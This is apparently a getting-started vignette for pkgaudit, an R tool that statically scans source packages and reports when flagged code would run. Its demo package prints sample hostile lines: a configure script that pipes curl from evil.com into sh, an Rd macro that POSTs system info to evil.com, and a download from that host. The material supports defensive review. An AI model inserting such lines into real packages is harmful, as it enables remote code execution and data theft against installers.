# Getting Started with pkgaudit

pkgaudit scans R packages for security-relevant files and code without
executing anything it scans. It reports what code does and when it runs,
so code that runs on install or load is distinguishable from code that
runs only when called.

A finding is not an accusation. Nearly all of the patterns and matches
flagged by pkgaudit have legitimate uses in R packages. pkgaudit helps
to identify what deserves reviewer attention, not what is malicious.

``` r

library(pkgaudit)
```

## Example package

`untrustedpkg` is a small source package shipped with pkgaudit for
demonstration. It is never built, checked, installed, or loaded; it
exists only to be scanned.

``` r

tarball <- system.file(
  "extdata", "untrustedpkg", "untrustedpkg_0.1.0.tar.gz",
  package = "pkgaudit"
)

exdir <- file.path(tempdir(), "untrustedpkg-example")
utils::untar(tarball, exdir = exdir)
pkg <- file.path(exdir, "untrustedpkg")
```

`untrustedpkg` contains the following files.

    [1] "configure"         "DESCRIPTION"       "man/fetch_data.Rd"
    [4] "R/fetch.R"         "R/zzz.R"          

The script that generates this package is in
[data-raw/create_untrustedpkg.R](https://github.com/tylerjssmith/pkgaudit/blob/main/data-raw/create_untrustedpkg.R).

## Auditing a package

[`audit_package()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_package.md)
scans an untarred source package.
[`print()`](https://rdrr.io/r/base/print.html) gives the scan metadata
and the number of findings by category.

``` r

result <- audit_package(pkg)
print(result, path = FALSE)
#> --- pkgaudit ----------------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-27 00:58 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> File contexts:  1
#> Patterns:       4
#> Matches:        1
#> Errors:         0
```

[`summary()`](https://rdrr.io/r/base/summary.html) reports the number of
findings by rule by phase. It also provides MITRE ATT&CK techniques
associated with each rule.

``` r

summary(result, path = FALSE)
#> --- pkgaudit Summary --------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-27 00:58 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> --- R Patterns --------------------------------------------------------------
#> phase            rule            n   attck
#> at_build         httr            1   T1041
#> at_build         system          1   T1059.003 T1059.004
#> at_check         download_file   1   T1105
#> at_check         httr            1   T1041
#> at_check         system          1   T1059.003 T1059.004
#> at_install_src   httr            1   T1041
#> at_install_src   system          1   T1059.003 T1059.004
#> at_load          system          1   T1059.003 T1059.004
#> none             download_file   1   T1105
#> 
#> none: reported at no phase because nothing in the package was seen to call
#> it. Code under R/ is read this way by rule; a caller elsewhere, or a user,
#> can still reach it. See vignette("rules").
#> 
#> --- Shell / Make Matches ----------------------------------------------------
#> phase            rule            n   attck
#> at_build         curl            1   T1041 T1105
#> at_check         curl            1   T1041 T1105
#> at_install_src   curl            1   T1041 T1105
#> 
#> --- Coverage ----------------------------------------------------------------
#> status       top_level   type          files   lines
#> parsed       R/          R                 2       6
#> parsed       man/        Rd                1      12
#> matched      .           shell             1       3
#> unexamined   .           DESCRIPTION       1
#> 
#> --- Errors ------------------------------------------------------------------
#> No exceptions were raised.
```

Phases overlap – building a package with vignettes, for example, also
installs and loads it – and one occurrence is counted under every phase
it runs in. The summary above reflects five findings, some counted under
multiple phases. To see only what is known to run automatically at
installation from source, for example, pass an argument to `phase`:

``` r

summary(result, phase = c("at_install_src"), path = FALSE)
#> --- pkgaudit Summary --------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-27 00:58 UTC with pkgaudit v0.4.0, rules v0.4.0
#> Phases:    at_install_src
#> 
#> --- R Patterns --------------------------------------------------------------
#> phase            rule     n   attck
#> at_install_src   httr     1   T1041
#> at_install_src   system   1   T1059.003 T1059.004
#> 
#> --- Shell / Make Matches ----------------------------------------------------
#> phase            rule     n   attck
#> at_install_src   curl     1   T1041 T1105
#> 
#> --- Coverage ----------------------------------------------------------------
#> status    top_level   type    files   lines
#> parsed    R/          R           2       6
#> parsed    man/        Rd          1      12
#> matched   .           shell       1       3
#> 
#> --- Errors ------------------------------------------------------------------
#> No exceptions were raised.
```

Both [`print()`](https://rdrr.io/r/base/print.html) and
[`summary()`](https://rdrr.io/r/base/summary.html) accept
`path = FALSE`, which omits the local filesystem path. This can matter
when sharing results, since the path may reveal a username or directory
layout.

## Examining results

A `pkgaudit` object is a named list of ordinary data frames, plus scan
metadata, so findings can be filtered, joined and reported on directly.

``` r

names(result)
#> [1] "file_contexts" "patterns"      "matches"       "coverage"     
#> [5] "errors"        "metadata"
```

### File contexts

`$file_contexts` reports security-relevant files, whatever they contain:
R runs a `configure` script, which can execute shell commands, so the
script should be reviewed.

``` r

result$file_contexts[, c("rule", "file_context")]
#>        rule file_context
#> 3 configure    configure
```

### Patterns

`$patterns` reports security-relevant R calls, located by
`file_context`, `line_number`, and `column_number`.

``` r

result$patterns[, c("rule", "file_context", "line_number", "column_number")]
#>            rule      file_context line_number column_number
#> 1 download_file         R/fetch.R           2             3
#> 2        system           R/zzz.R           2             3
#> 3 download_file man/fetch_data.Rd          11             1
#> 4          httr man/fetch_data.Rd           6            30
```

Additionally, `code_context` indicates where code sits within a file.
File and code context are used to determine the phases. `guarded` is
`TRUE` when a call may be stopped from running in the expected phase,
e.g., a `\dontrun{}` block or a vignette marked `eval=FALSE`. `indirect`
is `TRUE` when a call is made through a function name, e.g.,
`do.call("system", ...)` instead of
[`system()`](https://rdrr.io/r/base/system.html).

``` r

result$patterns[, c("rule", "code_context", "guarded", "indirect")]
#>            rule     code_context guarded indirect
#> 1 download_file      in_function   FALSE    FALSE
#> 2        system      onLoad_base   FALSE    FALSE
#> 3 download_file      Rd_examples   FALSE    FALSE
#> 4          httr Rd_Sexpr_install   FALSE    FALSE
```

`preview` provides a snippet of the code and its surroundings that may
allow reviewers to determine the relevance of a finding without opening
the file.

``` r

result$patterns[, c("preview")]
#> [1] "download.file(url, tempfile())"                                               
#> [2] "system(\"uname -a\")"                                                         
#> [3] "download.file(\"https://www.evil.com/data.csv\", tempfile())"                 
#> [4] "httr::POST(\"https://www.evil.com/collect\", body = list(info = Sys.info()..."
```

### Matches

`$matches` reports text matching regular expressions in shell and
Make-like files. Its columns mirror `$patterns`, but it does not have
`code_context`, `guarded`, or `indirect`.

``` r

result$matches[, c("rule", "file_context", "line_number", "preview")]
#>   rule file_context line_number                                   preview
#> 1 curl    configure           3 curl -s https://www.evil.com/evil.sh | sh
```

### Coverage

`$coverage` reports what pkgaudit made of each file it scanned: `parsed`
for R, matched against its parse tree; `matched` for shell and Make-like
files, matched as text; `exportable` for languages pkgaudit does not
read, such as C and Python; `unexamined` for files it did not read, such
as serialized `.rda` and `.rds` objects; and `error` where it tried to
read a file and could not.

``` r

result$coverage[, c("file_context", "language", "status", "reason", "lines")]
#>        file_context language     status       reason lines
#> 1       DESCRIPTION     <NA> unexamined no_extractor    NA
#> 2         R/fetch.R        R     parsed         <NA>     3
#> 3           R/zzz.R        R     parsed         <NA>     3
#> 4         configure    shell    matched         <NA>     3
#> 5 man/fetch_data.Rd       Rd     parsed         <NA>    12
```

### Errors

`$errors` reports files that pkgaudit tried to read and could not, with
information about what may have gone wrong. pkgaudit did not encounter
errors when scanning `untrustedpkg`.

### Metadata

`$metadata` is a list of metadata.

``` r

result$metadata
#> $pkg_name
#> [1] "untrustedpkg"
#> 
#> $pkg_version
#> [1] "0.1.0"
#> 
#> $pkg_path
#> [1] "/tmp/RtmpKnKV2F/untrustedpkg-example/untrustedpkg"
#> 
#> $pkg_is_tarball
#> [1] FALSE
#> 
#> $pkg_sha256
#> [1] "50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171"
#> 
#> $pkgaudit_version
#> [1] "0.4.0"
#> 
#> $pkgaudit_rules_version
#> [1] "0.4.0"
#> 
#> $pkgaudit_rules_sha256
#> [1] "5fc1ec8e93232517679fb03df0f08020d844912e701615de7827666be2f6a7cd"
#> 
#> $scanned
#> [1] "2026-08-27T00:58:37Z"
```

### Subsetting by phase

Every findings frame carries one logical column per lifecycle phase:
`at_autoconf`, `at_build`, `at_check`, `at_install_src`,
`at_install_bin`, `at_load`, `at_attach`, `at_unload`, `at_detach`. A
pattern inside an ordinary function is `FALSE` for all of them, since it
runs only if something calls it. These can be used to subset the data
frames and see what findings apply to each phase. For example, to see
what is known to run when `untrustedpkg` is loaded:

``` r

result$patterns[result$patterns$at_load,
                c("rule", "file_context", "code_context")]
#>     rule file_context code_context
#> 2 system      R/zzz.R  onLoad_base
```

## Reviewing findings

pkgaudit is a guide to human review, not a substitute for human
judgment. Below we consider the four patterns and one match for
`untrustedpkg`.

### Patterns

1.  An `\Sexpr{}` macro in `man/fetch_data.Rd` calls
    [`httr::POST()`](https://httr.r-lib.org/reference/POST.html) when
    the help page is rendered at build, check, and source installation.
    Reviewers should consider whether a help page should make an HTTP
    POST request and what it may send to an external host.

2.  The `\examples{}` block in the same help file calls
    [`download.file()`](https://rdrr.io/r/utils/download.file.html) at
    check. Reviewers should verify what is downloaded. Since this
    depends on an external host, and what is downloaded may change over
    time, reviewers should also consider how the download is used – for
    example, could another function execute code if the file ever
    contained it?

&nbsp;

    \name{fetch_data}
    \alias{fetch_data}
    \title{Fetch Data From a URL}
    \description{
      Downloads the contents of \code{url} to a temporary file.
      \Sexpr[results=hide]{httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()))}
    }
    \usage{fetch_data(url)}
    \arguments{\item{url}{A URL to download.}}
    \examples{
    download.file("https://www.evil.com/data.csv", tempfile())
    }

3.  `.onLoad()` in `R/zzz.R` calls
    [`system()`](https://rdrr.io/r/base/system.html) and runs when users
    call [`library()`](https://rdrr.io/r/base/library.html). It also
    runs at build, check, and source installation, each of which loads
    the package. While [`system()`](https://rdrr.io/r/base/system.html)
    calls are common in R packages, they are less common in lifecycle
    hooks like `.onLoad()`, and reviewers should inspect what commands
    would be run automatically on their systems.

&nbsp;

    .onLoad <- function(libname, pkgname) {
      system("uname -a")
    }

4.  The `configure` script may invoke `curl` at build, check, and source
    installation. Some R packages use `curl` to fetch dependencies that
    cannot be vendored with the package. Reviewers should verify what is
    fetched and what could happen if that changes.

&nbsp;

    #!/bin/sh
    echo configuring
    curl -s https://www.evil.com/evil.sh | sh

### Matches

1.  A regular function in `R/fetch.R` calls
    [`download.file()`](https://rdrr.io/r/utils/download.file.html), but
    a regular function is not known to run automatically, so this
    pattern is reported under `none`. A reviewer may still want to
    inspect if and when the function is called, and what would be
    downloaded.

&nbsp;

    fetch_data <- function(url) {
      download.file(url, tempfile())
    }

## Exporting findings

[`emit_sarif()`](https://tylerjssmith.github.io/pkgaudit/reference/emit_sarif.md)
renders a result as SARIF 2.1.0, the format code-scanning tools publish
results in. It returns the document as a string and writes nothing.

``` r

sarif <- emit_sarif(result)
substr(sarif, 1, 200)
#> {
#>   "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
#>   "version": "2.1.0",
#>   "runs": [
#>     {
#>       "tool": {
#>         "driver": {
#>           "name": "pkgaudit",
#>           "version": "0.4.0",
#> 
```

Written to a file and opened in an editor with a SARIF viewer, each
finding appears on the line it was found. `level` is `note` for every
result. When code executes is carried in `properties.phases`.

[`export_unscanned()`](https://tylerjssmith.github.io/pkgaudit/reference/export_unscanned.md)
writes the code pkgaudit cannot read into a directory so that a tool
such as Semgrep can scan it. A whole file is copied verbatim; a vignette
chunk is written into a file of its own, blank-padded so that its code
sits at the same line numbers it occupies in the source. A finding
another tool reports at line 40 of `intro.python.py` is therefore at
line 40 of `intro.Rmd`. `untrustedpkg` contains only R and Bash, so
[`export_unscanned()`](https://tylerjssmith.github.io/pkgaudit/reference/export_unscanned.md)
would create an empty directory.

## Auditing a tarball

A common workflow will be to scan a package that has not been installed.
[`audit_tarball()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_tarball.md)
takes a `.tar.gz` source package, validates it, extracts it to a
temporary directory, scans it, and removes the directory. An untrusted
archive is itself an attack surface, so validation fails closed: the
whole archive is refused rather than partially extracted.

``` r

print(audit_tarball(tarball), path = FALSE)
#> --- pkgaudit ----------------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source tarball)
#> SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44
#> Scanned:   2026-08-27 00:58 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> File contexts:  1
#> Patterns:       4
#> Matches:        1
#> Errors:         0
```

The result is a `pkgaudit` object like any other, so everything above
applies to it unchanged.

## Rule database integrity

The rules live in a versioned SQLite database shipped with the package.
[`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md)
reads it;
[`rules_version()`](https://tylerjssmith.github.io/pkgaudit/reference/rules_version.md)
reports the version.

``` r

rules_version()
#> [1] "0.4.0"

rules <- load_rules()
vapply(rules, nrow, integer(1))
#> file_contexts code_contexts      patterns       matches        phases 
#>            45            10            23            11            55
```

A modified database is one way to evade a scanner.
[`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md)
verifies the database against its bundled SHA-256 sidecar on every call
and refuses to load a modified one. The hash of an installed copy can
also be checked against the value published in the
[README](https://github.com/tylerjssmith/pkgaudit#rule-database-integrity):

``` r

digest::digest(
  system.file("db", "rules.db", package = "pkgaudit"),
  algo = "sha256",
  file = TRUE
)
#> [1] "5fc1ec8e93232517679fb03df0f08020d844912e701615de7827666be2f6a7cd"
```

The full rule set is documented in [Rule
Coverage](https://tylerjssmith.github.io/pkgaudit/articles/rules.md).
How pkgaudit works internally is in
[Internals](https://tylerjssmith.github.io/pkgaudit/articles/internals.md).
